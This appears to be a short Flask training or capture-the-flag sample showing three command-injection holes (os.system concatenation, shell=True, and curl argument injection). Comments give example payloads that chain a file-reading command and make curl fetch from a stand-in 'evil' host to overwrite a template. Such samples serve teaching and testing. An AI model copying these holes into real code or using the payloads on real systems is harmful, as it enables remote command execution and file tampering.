# Flask

import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

# Vuln 1: os.system con concatenacion
@app.post("/ping")
def ping():
    host = request.form["host"]
    os.system("ping -c 1 " + host)               # host = "127.0.0.1; cat /data/flags/*"
    return "done"

# Vuln 2: subprocess con shell=True
@app.get("/lookup")
def lookup():
    out = subprocess.check_output(f"nslookup {request.args['domain']}", shell=True)
    return out

# Vuln 3: sin shell, pero argument injection
@app.get("/fetch")
def fetch():
    url = request.args["url"]                    # url = "-o/app/templates/index.html http://evil/x"
    return subprocess.check_output(["curl", "-s", url])
